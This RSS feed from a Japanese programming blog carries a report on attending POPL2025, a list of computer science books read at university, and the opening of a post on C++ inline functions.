<?xml version="1.0"?>
<rss version="2.0">
  <channel>
    <title>tamaron&#39;s diary</title>
    <link>https://tamaron.hatenablog.com/</link>
    <description></description>
    <lastBuildDate>Sun, 25 May 2025 15:33:33 +0900</lastBuildDate>
    <docs>http://blogs.law.harvard.edu/tech/rss</docs>
    <generator>Hatena::Blog</generator>
    
      
      
        <item>
          <title>POPL2025に参加した</title>
          <link>https://tamaron.hatenablog.com/entry/2025/05/25/153333</link>          <description>&lt;p&gt;1/21~1/27にかけて&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%A2%A5%E1%A5%EA&quot;&gt;アメリ&lt;/a&gt;カ・&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B3%A5%ED%A5%E9%A5%C9%BD%A3&quot;&gt;コロラド州&lt;/a&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%C7%A5%F3%A5%D0%A1%BC&quot;&gt;デンバー&lt;/a&gt;で開催されたPOPL2025に参加してきました。
POPL (Principles of Programming Languages)は&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/ACM&quot;&gt;ACM&lt;/a&gt;系の&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%D7%A5%ED%A5%B0%A5%E9%A5%DF%A5%F3%A5%B0%B8%C0%B8%EC&quot;&gt;プログラミング言語&lt;/a&gt;に関するトップ会議の一つです。&lt;/p&gt;

&lt;p&gt;本会議自体は1週間のうちの中三日あり、他の日は同じ会場で様々なワークショップが開催されていました。
私は以下のイベントに参加しました。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Tutorial1 (Substructural types, Parallel programming)&lt;/li&gt;
&lt;li&gt;Workshop on WebAssembly&lt;/li&gt;
&lt;li&gt;Workshop on theory and practice of static analysis workshop&lt;/li&gt;
&lt;li&gt;Workshop on implementation of type systems&lt;/li&gt;
&lt;li&gt;POPL本会議&lt;/li&gt;
&lt;/ul&gt;


&lt;h2 id=&quot;飛行機&quot;&gt;飛行機&lt;/h2&gt;

&lt;p&gt;16時間くらい乗ってた気がします。
しんどかったです。
ヨーロッパに行った時と比べて時差ボケが本当にひどくて、&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%A2%A5%E1%A5%EA&quot;&gt;アメリ&lt;/a&gt;カに着いた後も毎日お昼寝してました。&lt;/p&gt;

&lt;h2 id=&quot;気候&quot;&gt;気候&lt;/h2&gt;

&lt;p&gt;寒かったです。
夜は大体-20°Cまで冷え込みました。
寒すぎて買い物に行くたびに体の末端の感覚がなくなりました。&lt;/p&gt;

&lt;h2 id=&quot;チュートリアル--ワークショップ&quot;&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%C1%A5%E5%A1%BC%A5%C8%A5%EA%A5%A2%A5%EB&quot;&gt;チュートリアル&lt;/a&gt; &amp;amp; ワークショップ&lt;/h2&gt;

&lt;p&gt;1日目の午前はsubstrural type systemの講義を聞きました。
substructural type systemは通常の型システムの基本的な3つの制約(Weakining, Exchange, Contraction)から
一部の制約を取り外すことで得られる型システムです。
例えば、通常の型システムは{E,W,C}と表され、線形型システムは{E}で、Affine型システムは{E,W}で表されます。
後半では、&lt;a href=&quot;https://www.cs.cmu.edu/~fp/papers/adjoint18b.pdf&quot;&gt;adjoint logic&lt;/a&gt;の紹介がありました。adjoint type systemではupshiftとdownshiftを導入することで、modality(型システムの制約集合)をプログラム内で変更することができます。&lt;/p&gt;

&lt;p&gt;午後は並行プログラミングの講義でした。
最初は、workとspanによる並列計算&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0&quot;&gt;アルゴリズム&lt;/a&gt;における実行時間の評価方法について説明があり、
後半は&lt;a href=&quot;https://github.com/MPLLang/mpl&quot;&gt;mplang&lt;/a&gt;という&lt;/p&gt;

&lt;p&gt;2日目はWorkshop on WebAssemblyに参加しました。
数学よりの発表が多く、主にWasmの実装の安全性のmechanizationが多かったです。
他に印象に残った発表では、MLIR-to-wasm&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%E9&quot;&gt;コンパイラ&lt;/a&gt;の発表があり、&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/LLVM&quot;&gt;LLVM&lt;/a&gt; IRに落とさずに抽象度が高いMLIRで最適化を行った方が、性能面で有利だという内容でした。&lt;/p&gt;

&lt;h2 id=&quot;本会議&quot;&gt;本会議&lt;/h2&gt;

&lt;p&gt;一週間の会議期間中に本会議のPOPLは中3日間で開催されました。&lt;/p&gt;

&lt;p&gt;とくに印象に残っているのはいくつかありますが、まずは&lt;a href=&quot;https://github.com/flux-rs/flux&quot;&gt;Flux&lt;/a&gt;の発表で、これはRustを篩型システムで拡張するものです。最適化や安全性に関して篩型は有用です。他には、&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Ocaml&quot;&gt;Ocaml&lt;/a&gt;の並列ライブラリで数学的にデータ競合がないことを保証するという&lt;a href=&quot;https://popl25.sigplan.org/details/POPL-2025-popl-research-papers/23/Data-Race-Freedom-la-Mode&quot;&gt;研究&lt;/a&gt;がありました。&lt;/p&gt;

&lt;p&gt;量子プログラミングに関する内容も面白いものが多く、回路の意味的な等価性保ったまま最適化する研究や、Rustの線形論理を量子回路のuncomputationに利用する研究がありました。&lt;/p&gt;

&lt;p&gt;また、昼食中にRustの意味論の設計に携わっているRalf Jungさんと写真を撮ることができました。とても嬉しかったです。&lt;/p&gt;

&lt;p&gt;基調講演は&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%CE%CC%BB%D2%A5%B3%A5%F3%A5%D4%A5%E5%A1%BC%A5%BF&quot;&gt;量子コンピュータ&lt;/a&gt;とプログラム合成に関するものがありました。&lt;/p&gt;

&lt;p&gt;&lt;span itemscope itemtype=&quot;http://schema.org/Photograph&quot;&gt;&lt;img src=&quot;https://cdn-ak.f.st-hatena.com/images/fotolife/t/tamaroning/20250525/20250525153524.jpg&quot; width=&quot;900&quot; height=&quot;1200&quot; loading=&quot;lazy&quot; title=&quot;&quot; class=&quot;hatena-fotolife&quot; itemprop=&quot;image&quot;&gt;&lt;/span&gt;&lt;/p&gt;

&lt;h2 id=&quot;発表&quot;&gt;発表&lt;/h2&gt;

&lt;p&gt;自分は本会議の2日目のSRCでポスター発表に参加しました。僕はWebAssembly&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%E9&quot;&gt;コンパイラ&lt;/a&gt;のライブ&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%DE%A5%A4%A5%B0%A5%EC%A1%BC%A5%B7%A5%E7%A5%F3&quot;&gt;マイグレーション&lt;/a&gt;の内容で発表しました。
英語のポスター発表は初めてでかなり緊張しました。人によっては英語の発音やスピードのせいで聞き取れないことが多くて、何度も聞き返すことがありました。もうリスニングを少し上達させたいです。&lt;/p&gt;

&lt;p&gt;&lt;span itemscope itemtype=&quot;http://schema.org/Photograph&quot;&gt;&lt;img src=&quot;https://cdn-ak.f.st-hatena.com/images/fotolife/t/tamaroning/20250525/20250525151947.jpg&quot; width=&quot;900&quot; height=&quot;1200&quot; loading=&quot;lazy&quot; title=&quot;&quot; class=&quot;hatena-fotolife&quot; itemprop=&quot;image&quot;&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;ポスター発表で上位3名に選ばれたので、翌日に口頭発表がありました。
結果は2位でした。手ぶらで帰ることにならなくて安心しました。&lt;/p&gt;

&lt;p&gt;&lt;span itemscope itemtype=&quot;http://schema.org/Photograph&quot;&gt;&lt;img src=&quot;https://cdn-ak.f.st-hatena.com/images/fotolife/t/tamaroning/20250525/20250525152304.jpg&quot; width=&quot;1200&quot; height=&quot;794&quot; loading=&quot;lazy&quot; title=&quot;&quot; class=&quot;hatena-fotolife&quot; itemprop=&quot;image&quot;&gt;&lt;/span&gt;&lt;/p&gt;

&lt;h2 id=&quot;観光&quot;&gt;観光&lt;/h2&gt;

&lt;p&gt;隙間の時間で&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B3%A5%ED%A5%E9%A5%C9%BD%A3&quot;&gt;コロラド州&lt;/a&gt;立美術館に行ったり、レストランに行ったりしました。
次はニューヨークに行きたいです。&lt;/p&gt;

&lt;p&gt;&lt;span itemscope itemtype=&quot;http://schema.org/Photograph&quot;&gt;&lt;img src=&quot;https://cdn-ak.f.st-hatena.com/images/fotolife/t/tamaroning/20250525/20250525153004.jpg&quot; width=&quot;900&quot; height=&quot;1200&quot; loading=&quot;lazy&quot; title=&quot;&quot; class=&quot;hatena-fotolife&quot; itemprop=&quot;image&quot;&gt;&lt;/span&gt;&lt;/p&gt;
</description>          <pubDate>Sun, 25 May 2025 15:33:33 +0900</pubDate>
          <guid isPermaLink="false">hatenablog://entry/6802418398327304978</guid>
          
          <enclosure url="https://cdn.image.st-hatena.com/image/scale/cee48be0de2139017a3f6e147e4bcbd62549d2ff/backend=imagemagick;version=1;width=1300/https%3A%2F%2Fcdn-ak.f.st-hatena.com%2Fimages%2Ffotolife%2Ft%2Ftamaroning%2F20250525%2F20250525151947.jpg" type="image/jpeg" length="0" />
        </item>
      
    
      
      
        <item>
          <title>大学4年間で読んだ本 (コンピュータサイエンス)</title>
          <link>https://tamaron.hatenablog.com/entry/2025/03/26/200230</link>          <description>&lt;ul class=&quot;table-of-contents&quot;&gt;
    &lt;li&gt;&lt;a href=&quot;#はじめに&quot;&gt;はじめに&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;#ソフトウェア設計&quot;&gt;ソフトウェア設計&lt;/a&gt;&lt;ul&gt;
            &lt;li&gt;&lt;a href=&quot;#Cソフトウェア設計-高品質設計の原則とデザインパターン&quot;&gt;C++ソフトウェア設計 ―高品質設計の原則とデザインパターン&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;#システムソフトウェア&quot;&gt;システムソフトウェア&lt;/a&gt;&lt;ul&gt;
            &lt;li&gt;&lt;a href=&quot;#Linkers--loaders&quot;&gt;Linkers &amp;amp; loaders&lt;/a&gt;&lt;/li&gt;
            &lt;li&gt;&lt;a href=&quot;#自作OSで学ぶマイクロカーネルの設計と実装&quot;&gt;自作OSで学ぶマイクロカーネルの設計と実装&lt;/a&gt;&lt;/li&gt;
            &lt;li&gt;&lt;a href=&quot;#Binary-Hacks-Rebooted-低レイヤの世界を探検するテクニック89選&quot;&gt;Binary Hacks Rebooted —低レイヤの世界を探検するテクニック89選&lt;/a&gt;&lt;/li&gt;
            &lt;li&gt;&lt;a href=&quot;#入門-eBPF-Linuxカーネルの可視化と機能拡張&quot;&gt;入門 eBPF ―Linuxカーネルの可視化と機能拡張&lt;/a&gt;&lt;/li&gt;
            &lt;li&gt;&lt;a href=&quot;#Compilers-Principles-Techniques-and-Tools&quot;&gt;Compilers: Principles, Techniques, and Tools&lt;/a&gt;&lt;/li&gt;
            &lt;li&gt;&lt;a href=&quot;#並列プログラミング&quot;&gt;並列プログラミング&lt;/a&gt;&lt;/li&gt;
            &lt;li&gt;&lt;a href=&quot;#詳解-Rustアトミック操作とロック-並行処理実装のための低レイヤプログラミング&quot;&gt;詳解 Rustアトミック操作とロック ―並行処理実装のための低レイヤプログラミング&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;#ハードウェア&quot;&gt;ハードウェア&lt;/a&gt;&lt;ul&gt;
            &lt;li&gt;&lt;a href=&quot;#ディジタル回路設計とコンピュータアーキテクチャ-第2版&quot;&gt;ディジタル回路設計とコンピュータアーキテクチャ 第2版&lt;/a&gt;&lt;/li&gt;
            &lt;li&gt;&lt;a href=&quot;#パタヘネ上下&quot;&gt;パタヘネ上・下&lt;/a&gt;&lt;/li&gt;
            &lt;li&gt;&lt;a href=&quot;#RISC-VとChiselで学ぶ-はじめてのCPU自作-オープンソース命令セットによるカスタムCPU実装への第一歩&quot;&gt;RISC-VとChiselで学ぶ はじめてのCPU自作 ――オープンソース命令セットによるカスタムCPU実装への第一歩&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;#数学&quot;&gt;数学&lt;/a&gt;&lt;ul&gt;
            &lt;li&gt;&lt;a href=&quot;#型システム入門-プログラミング言語と型の理論&quot;&gt;型システム入門 プログラミング言語と型の理論&lt;/a&gt;&lt;/li&gt;
            &lt;li&gt;&lt;a href=&quot;#Advanced-Topics-in-Types-and-Programming-Languages&quot;&gt;Advanced Topics in Types and Programming Languages&lt;/a&gt;&lt;/li&gt;
            &lt;li&gt;&lt;a href=&quot;#Principles-of-Program-Analysis&quot;&gt;Principles of Program Analysis&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;#その他&quot;&gt;その他&lt;/a&gt;&lt;ul&gt;
            &lt;li&gt;&lt;a href=&quot;#コンピュータネットワーク第6版&quot;&gt;コンピュータネットワーク第6版&lt;/a&gt;&lt;/li&gt;
            &lt;li&gt;&lt;a href=&quot;#Winnyの技術&quot;&gt;Winnyの技術&lt;/a&gt;&lt;/li&gt;
            &lt;li&gt;&lt;a href=&quot;#セキュリティコンテストチャレンジブック--CTFで学ぼう-情報を守るための戦い方-&quot;&gt;セキュリティコンテストチャレンジブック -CTFで学ぼう! 情報を守るための戦い方-&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
    &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;はじめに&quot;&gt;はじめに&lt;/h1&gt;

&lt;p&gt;大学の4年間で読んだ&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D4%A5%E5%A1%BC%A5%BF%A5%B5%A5%A4%A5%A8%A5%F3%A5%B9&quot;&gt;コンピュータサイエンス&lt;/a&gt;の本のリスト。
授業で使ったものは入れてない。&lt;/p&gt;

&lt;h1 id=&quot;ソフトウェア設計&quot;&gt;ソフトウェア設計&lt;/h1&gt;

&lt;h2 id=&quot;Cソフトウェア設計-高品質設計の原則とデザインパターン&quot;&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/C%2B%2B&quot;&gt;C++&lt;/a&gt;ソフトウェア設計 ―高品質設計の原則と&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%C7%A5%B6%A5%A4%A5%F3%A5%D1%A5%BF%A1%BC%A5%F3&quot;&gt;デザインパターン&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://www.amazon.co.jp/dp/4814400454/&quot;&gt;https://www.amazon.co.jp/dp/4814400454/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/C%2B%2B&quot;&gt;C++&lt;/a&gt;で大規模なソフトウェアを書く際に役に立つテクニックや考え方がまとめられている。が、内容は難しく、&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/C%2B%2B&quot;&gt;C++&lt;/a&gt;で3年以上経験がないと理解が難しいと思う。&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/C%2B%2B&quot;&gt;C++&lt;/a&gt;だけでなくSRPのような他の言語に共通する話も多い。&lt;/p&gt;

&lt;h1 id=&quot;システムソフトウェア&quot;&gt;システムソフトウェア&lt;/h1&gt;

&lt;h2 id=&quot;Linkers--loaders&quot;&gt;Linkers &amp;amp; loaders&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://www.amazon.co.jp/dp/4274064379/&quot;&gt;https://www.amazon.co.jp/dp/4274064379/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;日本語訳されている数少ないリンカの本。静的リンク、動的リンクの基本的な仕組みは詳しく書かれている。
20年前に出版された本なので、情報が古いし、LTOなどの情報が載っていない。&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/LLVM&quot;&gt;LLVM&lt;/a&gt;/&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/gcc&quot;&gt;gcc&lt;/a&gt;のドキュメントやmoldの(昔のコミットの)&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%BD%A1%BC%A5%B9%A5%B3%A1%BC%A5%C9&quot;&gt;ソースコード&lt;/a&gt;を読むのが良いと思う。&lt;/p&gt;

&lt;h2 id=&quot;自作OSで学ぶマイクロカーネルの設計と実装&quot;&gt;自作OSで学ぶ&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%DE%A5%A4%A5%AF%A5%ED%A5%AB%A1%BC%A5%CD%A5%EB&quot;&gt;マイクロカーネル&lt;/a&gt;の設計と実装&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://www.amazon.co.jp/dp/4798068713/&quot;&gt;https://www.amazon.co.jp/dp/4798068713/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Nintendoの&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%A8%A5%DF%A5%E5%A5%EC%A1%BC%A5%BF&quot;&gt;エミュレータ&lt;/a&gt;(OSが&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%DE%A5%A4%A5%AF%A5%ED%A5%AB%A1%BC%A5%CD%A5%EB&quot;&gt;マイクロカーネル&lt;/a&gt;)について勉強したかったので読んだ。
&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%DE%A5%A4%A5%AF%A5%ED%A5%AB%A1%BC%A5%CD%A5%EB&quot;&gt;マイクロカーネル&lt;/a&gt;の基本的な仕組みはもちろん、最近の研究でメッセージパッシングがどのように高速化されているかなどのコラムが書いてあって面白かった。&lt;/p&gt;

&lt;h2 id=&quot;Binary-Hacks-Rebooted-低レイヤの世界を探検するテクニック89選&quot;&gt;Binary Hacks Rebooted —低レイヤの世界を探検するテクニック89選&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://www.amazon.co.jp/dp/4814400853/&quot;&gt;https://www.amazon.co.jp/dp/4814400853/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;主に&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Linux&quot;&gt;Linux&lt;/a&gt;やELFに関連する箇所を読んだ。個人的にはvdsoが面白かった。&lt;/p&gt;

&lt;h2 id=&quot;入門-eBPF-Linuxカーネルの可視化と機能拡張&quot;&gt;入門 eBPF ―&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Linux&quot;&gt;Linux&lt;/a&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%AB%A1%BC%A5%CD%A5%EB&quot;&gt;カーネル&lt;/a&gt;の可視化と機能拡張&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://www.amazon.co.jp/dp/481440056X/&quot;&gt;https://www.amazon.co.jp/dp/481440056X/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Linux&quot;&gt;Linux&lt;/a&gt;について学びたくて読んだ。eBPFは日本語でまとまっている文書があまりないのでこれが良いと思う。&lt;/p&gt;

&lt;h2 id=&quot;Compilers-Principles-Techniques-and-Tools&quot;&gt;Compilers: Principles, Techniques, and Tools&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://www.amazon.co.jp/dp/0321486811/&quot;&gt;https://www.amazon.co.jp/dp/0321486811/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%E9&quot;&gt;コンパイラ&lt;/a&gt;の有名な教科書。主にパーサーの章を読んだ。&lt;/p&gt;

&lt;h2 id=&quot;並列プログラミング&quot;&gt;並列プログラミング&lt;/h2&gt;

&lt;h2 id=&quot;詳解-Rustアトミック操作とロック-並行処理実装のための低レイヤプログラミング&quot;&gt;詳解 Rustアトミック操作とロック ―並行処理実装のための低レイ&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%E4%A5%D7%A5%ED%A5%B0&quot;&gt;ヤプログ&lt;/a&gt;ラミング&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://www.amazon.co.jp/dp/4814400519/&quot;&gt;https://www.amazon.co.jp/dp/4814400519/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;並列プログラミングのための全てが書かれている。メモリモデルやπ計算などのトピックも扱われていて良かった。&lt;/p&gt;

&lt;h1 id=&quot;ハードウェア&quot;&gt;ハードウェア&lt;/h1&gt;

&lt;h2 id=&quot;ディジタル回路設計とコンピュータアーキテクチャ-第2版&quot;&gt;ディジタル回路設計とコンピュータ&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%A2%A1%BC%A5%AD%A5%C6%A5%AF%A5%C1%A5%E3&quot;&gt;アーキテクチャ&lt;/a&gt; 第2版&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://www.amazon.co.jp/dp/4798147524/&quot;&gt;https://www.amazon.co.jp/dp/4798147524/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;アナログから&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%A2%A5%BB%A5%F3%A5%D6%A5%EA&quot;&gt;アセンブリ&lt;/a&gt;までを解説した本。大学入学前に読んでた。
500ページくらいあってとにかく重いが、これを読めばコンピュータの基本的な仕組みを理解できると思う。&lt;/p&gt;

&lt;h2 id=&quot;パタヘネ上下&quot;&gt;パタヘネ上・下&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://www.amazon.co.jp/dp/4296070096/&quot;&gt;https://www.amazon.co.jp/dp/4296070096/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;コンピュータ&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%A2%A1%BC%A5%AD%A5%C6%A5%AF%A5%C1%A5%E3&quot;&gt;アーキテクチャ&lt;/a&gt;の授業ではパタヘネ上が教科書として指定された。上巻は知っている話が多かった。
前提知識がなくても読めるのは良いと思う。&lt;/p&gt;

&lt;h2 id=&quot;RISC-VとChiselで学ぶ-はじめてのCPU自作-オープンソース命令セットによるカスタムCPU実装への第一歩&quot;&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/RISC&quot;&gt;RISC&lt;/a&gt;-VとChiselで学ぶ はじめてのCPU自作 ――&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%AA%A1%BC%A5%D7%A5%F3%A5%BD%A1%BC%A5%B9&quot;&gt;オープンソース&lt;/a&gt;命令セットによるカスタムCPU実装への第一歩&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://www.amazon.co.jp/dp/4297123053/&quot;&gt;https://www.amazon.co.jp/dp/4297123053/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/RISC&quot;&gt;RISC&lt;/a&gt;-VとCPU自作をやってみたかったので買った。&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/RISC&quot;&gt;RISC&lt;/a&gt;-Vのモジュール化された仕様や命令&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%A8%A5%F3%A5%B3%A1%BC%A5%C7%A5%A3%A5%F3%A5%B0&quot;&gt;エンコーディング&lt;/a&gt;について知れてよかった。&lt;/p&gt;

&lt;h1 id=&quot;数学&quot;&gt;数学&lt;/h1&gt;

&lt;h2 id=&quot;型システム入門-プログラミング言語と型の理論&quot;&gt;型システム入門 &lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%D7%A5%ED%A5%B0%A5%E9%A5%DF%A5%F3%A5%B0%B8%C0%B8%EC&quot;&gt;プログラミング言語&lt;/a&gt;と型の理論&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://www.amazon.co.jp/dp/B07CBB69SS/&quot;&gt;https://www.amazon.co.jp/dp/B07CBB69SS/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;通称TAPL。ラムダ計算をベースに拡張した体型についてひたすら&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%B5%A2%C7%BC%CB%A1&quot;&gt;帰納法&lt;/a&gt;で証明する本。&lt;/p&gt;

&lt;h2 id=&quot;Advanced-Topics-in-Types-and-Programming-Languages&quot;&gt;Advanced Topics in Types and Programming Languages&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://www.amazon.co.jp/dp/0262552671/&quot;&gt;https://www.amazon.co.jp/dp/0262552671/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;TAPLの発展編。リージョン推論とsubstructural type systemの箇所を読んだ。
POPLに行ったときにまさか役に立つとは思わなかった。&lt;/p&gt;

&lt;h2 id=&quot;Principles-of-Program-Analysis&quot;&gt;Principles of Program Analysis&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://www.amazon.co.jp/dp/3642084745/&quot;&gt;https://www.amazon.co.jp/dp/3642084745/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;サークルの輪読会で読んだ。&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%E9&quot;&gt;コンパイラ&lt;/a&gt;でよく使われている解析手法の基礎について学ぶことができる。
束(lattice)、半順序、余&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%B5%A2%C7%BC%CB%A1&quot;&gt;帰納法&lt;/a&gt;などの数学的な概念を学ぶことができて良かった。&lt;/p&gt;

&lt;h1 id=&quot;その他&quot;&gt;その他&lt;/h1&gt;

&lt;h2 id=&quot;コンピュータネットワーク第6版&quot;&gt;コンピュータネットワーク第6版&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://www.amazon.co.jp/dp/4296070428/&quot;&gt;https://www.amazon.co.jp/dp/4296070428/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ネットワークの教科書。研究室の輪読会で読んだ。最初は何を勉強しているのかよくわからなかったが、&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/TCP/IP&quot;&gt;TCP/IP&lt;/a&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%D7%A5%ED%A5%C8%A5%B3%A5%EB&quot;&gt;プロトコル&lt;/a&gt;を自作してみると繋がりが理解できるようになって良かった。&lt;/p&gt;

&lt;h2 id=&quot;Winnyの技術&quot;&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Winny%A4%CE%B5%BB%BD%D1&quot;&gt;Winnyの技術&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://www.amazon.co.jp/dp/4756145485/&quot;&gt;https://www.amazon.co.jp/dp/4756145485/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;当時の&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/P2P&quot;&gt;P2P&lt;/a&gt;ソフトウェアの課題であった通信速度などをどのように解決したか、どのようにファイルを分散管理したか、などの技術的な話が書かれている。面白かった。&lt;/p&gt;

&lt;h2 id=&quot;セキュリティコンテストチャレンジブック--CTFで学ぼう-情報を守るための戦い方-&quot;&gt;セキュリティコンテストチャレンジブック -CTFで学ぼう! 情報を守るための戦い方-&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://www.amazon.co.jp/dp/4839956480/&quot;&gt;https://www.amazon.co.jp/dp/4839956480/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;pwnの章を読んだ。最近はもっと&lt;a href=&quot;https://www.amazon.co.jp/dp/4839973490/&quot;&gt;新しい本&lt;/a&gt;が出ている。&lt;/p&gt;
</description>          <pubDate>Wed, 26 Mar 2025 20:02:30 +0900</pubDate>
          <guid isPermaLink="false">hatenablog://entry/6802418398339556976</guid>
          
          <enclosure url="https://ogimage.blog.st-hatena.com/26006613542645241/6802418398339556976/1742993635" type="image/png" length="0" />
        </item>
      
    
      
      
        <item>
          <title>C++のinline関数の仕様</title>
          <link>https://tamaron.hatenablog.com/entry/2025/01/14/180727</link>          <description>&lt;p&gt;「inline関数はインライン化される」という誤った主張をする記事が多いため、調べてまとめてみた。&lt;/p&gt;

&lt;p&gt;なお、この記事は、&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/C%2B%2B&quot;&gt;C++&lt;/a&gt;23の規格書[1]を元にしている。&lt;/p&gt;

&lt;h2 id=&quot;インライン化とは&quot;&gt;インライン化とは?&lt;/h2&gt;

